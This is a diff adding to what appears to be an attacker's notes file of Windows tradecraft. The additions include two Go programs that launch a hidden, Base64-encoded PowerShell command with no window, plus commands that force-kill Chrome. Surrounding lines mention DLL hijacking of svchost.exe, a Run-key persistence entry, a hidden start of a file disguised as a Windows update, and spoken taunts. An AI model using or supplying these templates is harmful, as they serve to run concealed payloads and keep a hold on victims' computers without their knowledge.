@@ -1277,6 +1277,73 @@ int main() {
       return 0;
 }
 
+
+package main
+
+import (
+    "syscall"
+)
+
+func main() {
+    // Direct Win32 API call
+    procInfo := syscall.ProcessInformation{}
+    startupInfo := syscall.StartupInfo{}
+
+    commandLine := syscall.StringToUTF16Ptr("powershell.exe -WindowStyle Hidden -Enc \"    \"")
+
+    syscall.CreateProcess(
+        nil,               // Application name
+        commandLine,       // Command line
+        nil,               // Process security attributes
+        nil,               // Thread security attributes
+        false,             // Inherit handles
+        0x08000000,        // CREATE_NO_WINDOW flag
+        nil,               // Environment
+        nil,               // Current directory
+        &startupInfo,      // Startup info
+        &procInfo,         // Process info
+    )
+}
+
+
+package main
+
+import (
+        "syscall"
+        "unsafe"
+)
+
+func main() {
+        var procInfo syscall.ProcessInformation
+        startupInfo := syscall.StartupInfo{Cb: uint32(unsafe.Sizeof(syscall.StartupInfo{}))}
+
+        // 1. Replace with REAL Base64-encoded PowerShell command
+        // Example: "Write-Output 'test'" → "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAHQAZQBzAHQAIgA="
+        encodedCommand := "" // Must be valid Base64
+
+        // 2. Correctly format the command line (no %s, direct concatenation)
+        cmd := "powershell.exe -WindowStyle Hidden -Enc " + encodedCommand
+        commandLine, _ := syscall.UTF16PtrFromString(cmd)
+
+        // 3. Execute silently (no window, no errors)
+        syscall.CreateProcess(
+                nil,
+                commandLine,
+                nil,
+                nil,
+                false,
+                0x08000000, // CREATE_NO_WINDOW flag
+                nil,
+                nil,
+                &startupInfo,
+                &procInfo,
+        )
+
+        // 4. Avoid handle leaks (no defer, immediate close)
+        syscall.CloseHandle(procInfo.Process)
+        syscall.CloseHandle(procInfo.Thread)
+}
+
 +------------------------------------------------------------------------------+
 |                          Dll Hijack  svchost.exe  Secur32.dll                |
 +------------------------------------------------------------------------------+
@@ -1362,6 +1429,14 @@ timeout /T 2 >nul
 
 
 taskkill /im firefox.exe /f
+powershell.exe -c "Get-Process chrome | Stop-Process"
+Stop-Process -Name chrome
+Stop-Process -Name chrome -Force
+Get-Process chrome | ForEach-Object { Stop-Process -Id $_.Id -Force }
+Get-Process chrome | Stop-Process -Force
+Stop-Process -Name *chrome* -Force
+Stop-Process -Name chrome -Force -ErrorAction SilentlyContinue
+
 
 Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List #(Start App)
 reg delete HKU\S-1-5-21-2421872441-1145948854-2580278455-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v IntelGraphicX /f
@@ -1374,6 +1449,8 @@ powershell -WindowStyle Hidden Start-Process -FilePath $env:TMP\Update-KB4524147
 
 #Female Voice
 Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Volume = 100; $synth.SelectVoice('Microsoft Zira Desktop'); $synth.Speak('Delicate things are not as easy to break as you may think.')
+
+start https://youtube.com/@RojahsMontari
 
 #Male Voice
 Add-Type -AssemblyName System.speech; $synth = New-Object System.Speech.Synthesis.SpeechSynthesizer; $synth.Speak('Delicate things are not as easy to break as you may think.')
